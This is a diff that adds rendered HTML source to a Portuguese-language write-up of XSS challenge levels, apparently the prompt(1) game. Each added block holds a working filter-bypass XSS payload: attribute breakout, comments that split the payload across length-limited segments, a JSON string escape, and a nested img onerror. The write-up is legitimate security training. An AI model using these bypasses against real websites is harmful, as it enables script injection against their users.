@@ -133,7 +133,9 @@ Description: No Level 7, a entrada é dividida em segmentos de no máximo 12 car
 
 HTML source:
 ```
-
+<p class="comment" title=""><svg/a="></p>
+<p class="comment" title=""onload='/*"></p>
+<p class="comment" title="*/prompt(1)'"></p>
 ```
 
 -----
@@ -181,7 +183,7 @@ Description: No A, o filtro remove a palavra prompt e também impede o uso de ap
 
 HTML source:
 ```
-
+<script>prompt(1)</script>
 ```
 
 -----
@@ -197,7 +199,11 @@ Description: No B, a dificuldade está em contornar a falta de operadores especi
 
 HTML source:
 ```
-
+<script>                                    
+    var data = {"action":"login","message":"Welcome back, "(prompt(1))in"."};          
+    if (data.action === "login")            
+        document.write(data.message)        
+</script>
 ```
 
 -----
@@ -229,7 +235,7 @@ Description: No D, a tarefa é manipular um objeto JSON e contornar as limitaç�
 
 HTML source:
 ```
-
+<img src="<img src="onerror=prompt(1)>">
 ```
 
 -----
@@ -261,7 +267,7 @@ Description: No F, a entrada é dividida em segmentos de no máximo 15 caractere
 
 HTML source:
 ```
-
+<input type="text" value=""><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>">
 ```
 
 -----
